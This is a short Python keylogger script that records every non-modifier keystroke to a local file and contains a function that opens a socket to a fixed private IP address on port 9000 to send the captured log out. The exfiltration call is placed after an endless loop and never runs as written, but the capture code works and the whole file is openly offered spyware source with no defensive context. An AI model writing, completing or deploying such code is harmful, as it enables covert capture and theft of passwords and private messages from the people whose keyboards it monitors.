import keyboard
import socket
import os

log_file = "keylogs.txt"
server_ip = "192.168.122.182"
port = 9000

def main():
    print("Starting keylogger...")
    
    while True:
        events = keyboard.read_event()
        
        if events.name not in keyboard.all_modifiers:
            with open(log_file, "a") as f:
                f.write(str(events.name))
                print("Key pressed: ", str(events.name))
                
    send_log()

def send_log():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, port))
        
        with open(log_file, "rb") as f:
            data = f.read()
            s.sendall(data)
            
        print("Log file sent to", server_ip)

if __name__ == "__main__":
    main()